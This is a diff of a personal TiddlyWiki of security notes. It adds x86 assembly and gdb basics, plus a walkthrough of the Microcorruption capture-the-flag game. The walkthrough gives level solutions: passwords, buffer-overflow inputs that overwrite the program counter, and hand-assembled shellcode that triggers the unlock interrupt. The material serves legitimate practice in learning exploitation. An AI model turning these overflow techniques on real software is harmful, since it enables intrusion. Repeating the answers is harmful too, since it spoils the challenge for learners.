@@ -232,6 +232,8 @@ Error message and password prompt
 
 <li>Malware Analysis Notes - 8</li>
 
+<li>Microcorruption</li>
+
 <li>OPSEC for Pentesters</li>
 
 <li>OSCP Notes</li>
@@ -8629,7 +8631,7 @@ Tool: Bytecode viewer by Konloch, javap (disassembler), javac (compiler).</pre>
 <div created="20180424234704663" modified="20180516191840582" title="$:/state/showeditpreview">
 <pre>yes</pre>
 </div>
-<div created="20180616184138831" modified="20180616184147168" title="$:/state/sidebar">
+<div created="20180616184138831" modified="20180809163315858" title="$:/state/sidebar">
 <pre>yes</pre>
 </div>
 <div created="20180425011450510" modified="20180425011451988" title="$:/state/tab--1963855381">
@@ -8647,7 +8649,7 @@ Tool: Bytecode viewer by Konloch, javap (disassembler), javac (compiler).</pre>
 <div created="20180424234616405" modified="20180517191701014" title="$:/state/tab/sidebar--1835078512">
 <pre>$:/core/ui/SideBar/Recent</pre>
 </div>
-<div list="About [[Binary Exploitation Notes]]" title="$:/StoryList">
+<div list="About" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -9269,12 +9271,14 @@ Right clicking on the plugin/extension will bring up &quot;Inspect&quot; which c
 
 In console, chrome.whatever allows chrome API access. </pre>
 </div>
-<div created="20180616183925145" modified="20180729155548199" tags="" title="CTF notes">
+<div created="20180616183925145" modified="20180808162508917" tags="" title="CTF notes">
 <pre>[[hash length extension attack]]
 
 [[CTFZone 2018 Quals]]
 
-[[ISITDTU CTF 2018 Quals]]</pre>
+[[ISITDTU CTF 2018 Quals]]
+
+[[Microcorruption]]</pre>
 </div>
 <div created="20180722212952280" modified="20180722213709143" tags="" title="CTFZone 2018 Quals">
 <pre>https://ctftime.org/event/632
@@ -9332,8 +9336,70 @@ unsafe fuctions: gets, strcpy, strncpy, strcat, strncat, sprintf, scanf, sscanf,
 
 defenses: gcc stackguard, stack shield, MS buffer security check. DEP, ASLR,SEHOP, EMET.</pre>
 </div>
-<div created="20180624225140945" modified="20180624225140945" title="Exploitation Notes - 1">
-<pre></pre>
+<div created="20180624225140945" modified="20180809151903570" title="Exploitation Notes - 1">
+<pre>Registers: General Purpose: EAX, EBX, ECX, EDX (or R for 64-bit)
+
+ESP - stack pointer, top of current stack frame (lower memory)
+
+EBP - base pointer, bottom of current stack frame (higher memory)
+
+EIP - instruction pointer, points to the next instruction to be executed
+
+EFLAGS - ZF - set to 1 when result of an op = 0, CF - set to 1 when result of op is too large/small, SF - set to 1 when result of an op is negative.
+
+Moving data:
+
+```
+mov ebx, eax - move value in eax to ebx.
+mov eax, 0xdeadbeef - move 0xdeadbeef into eax
+mov edx, dword ptr [0xaddr], move 4 byte value AT THE ADDR into edx
+mov ecx, dword ptr [edx], move 4 byte value AT THE ADDRESS IN EDX to ecx 
+```
+
+math:
+
+```
+sub x,y
+add x,y
+inc x
+dec x
+xor x,y
+or x,y
+```
+
+jumps: https://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Jump_Instructions http://unixwiz.net/techtips/x86-jumps.html
+
+stack manipulation:
+
+```
+push ebx = sub esp, 4, mov dword ptr [esp], ebx
+pop ebx = mov ebx, dword ptr [esp], add esp, 4
+```
+
+call/ret:
+
+```
+call func
+ret
+```
+
+reading: 0x200 in the hacking book &amp; practical rev book chap 1
+
+compiling: source -&gt; asm -&gt; obj file -&gt; obj file + libs -&gt; binary file
+
+tools: wxhexeditor, xxd, strings, strings -e (change encoding), readelf, file, objdump -d, ida pro, edb (evans debugger), gdb.
+
+ELF memory layout: High addresses to low. Stack segment grows towards lower, heap segment grows towards higher, bss segment, data segment, text/code segment.
+
+gdb examine: x/NFU. N = number, F = format, U = unit. 
+
+```
+x/10xb addr - examine 10 bytes in hex
+x/xw addr - examine 1 word in hex
+x/s addr - examine null terminated string
+```
+
+tracing tools: ltrace - library calls, strace - system calls.</pre>
 </div>
 <div created="20180528150220245" modified="20180528171611472" tags="" title="Go Programming notes">
 <pre>Notes taken while viewing The Go Programming Language
@@ -10530,6 +10596,75 @@ Manual symbol resolution: shellcode must find kernel32.dll in memory, parse it a
 Online disassembler / ODA maybe useful for shellcode analysis.
 
 C++ analysis and 64-bit malware are skipped.</pre>
+</div>
+<div created="20180808162525879" modified="20180808233627165" title="Microcorruption">
+<pre>https://microcorruption.com/
+
+New Orleans: Input password is compared with string at 0x2400. password: wyO#oJr
+
+Sydney: input is compared against hex values. password: 5e3e236c77317b22 (hex)
+
+Hanoi: Comparing 0x2410 against 0x23. Input AAAABBBBCCCCDDDDAAAABBBBCCCCDDDD23 (hex)
+
+Cusco: PC overwrite after 41414141414141414141414141414141 (hex). Jumping to unlock function using 414141414141414141414141414141414644 or jumping to the line that calls unlock function 414141414141414141414141414141412845 both work. 
+
+Reykjavik: Input is at 0x43da and when 0x2400 is excuted, it's compared with 0x68ff. password: 66ff.
+
+Whitehorse: Overflow. No part of the code does INT(0x7F). This needs to execute to unlock the door:
+
+```
+push #0x7f
+call #0x4532
+
+30127f00b0123245 &lt; assembly to machine code.
+```
+
+Input is stored at 0x384c. if input is 4141424243434444454546464747484849495050 then PC becomes 4949. 4949 can be replaced with 4c38 (0x384c) where the input is stored and 30127f00b0123245 can replace 41414242.... to execute push 0x7f and call INT. Input: 30127f00b012324545454646474748484c38
+
+Montevideo: This does not contain push 0x7f and call INT either. Input storage 0x2400 then 0x43ee. 00 seems to break everything. 
+
+```
+3012 7f00      push	#0x7f &lt; this needs to be replaced.
+
+mov &amp;0x445e, r12 &lt; move byte at 0x445e (it's 7e) to r12
+inc r12 (7e becomes 7f)
+push r12 (same as push 7f)
+call #0x454c finally call INT
+
+1c425e441c530c12b0124c45
+```
+
+final input: 1c425e441c530c12b0124c4547474848ee435050
+
+Johannesburg: after puts(that password is not correct), 0x58 is compared to 0x11(sp). If compare fails, it knows that input was too long. 
+
+```
+4141424243434444454546464747484849495050 &lt; original
+4141424243434444454546464747484849585050 &lt; new input with 49 replaced with 58.
+```
+
+PC is set to 5050 with the new input. This code contains unlock code @ 0x4446. final input: 4141424243434444454546464747484849584644
+
+Santa Cruz: This one has username and password. Unlock is at 0x444a. There are some checks on the input. 
+
+```
+username: 414142424343444445454646474748484910(10 used to bypass some checks?)5050515152525353545455555656575758585959606061614a44(unlock addr 444a) 636364646565 
+
+password: AAAAAAAAAAAAAAAAA
+```
+
+Jakarta: unlock @ 0x444c. cmp.b only compares last half of the register... Password length + username length can't be above 32 or 0021. Since only 21 is checked and 00 isn't. if the username length is 32 and password length is long enough to make the lower bytes of the register less than 21, PC can be overwritten. 
+
+```
+username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA * 7
+
+```
+
+final input password:  
+414141414c444141414141414141414141414141414141414141414141414141
+
+Addis Ababa: </pre>
 </div>
 <div created="20180806131720547" modified="20180806133325817" title="OPSEC for Pentesters">
 <pre>Notes from PluralSight course: https://www.pluralsight.com/courses/opsec-penetration-testers
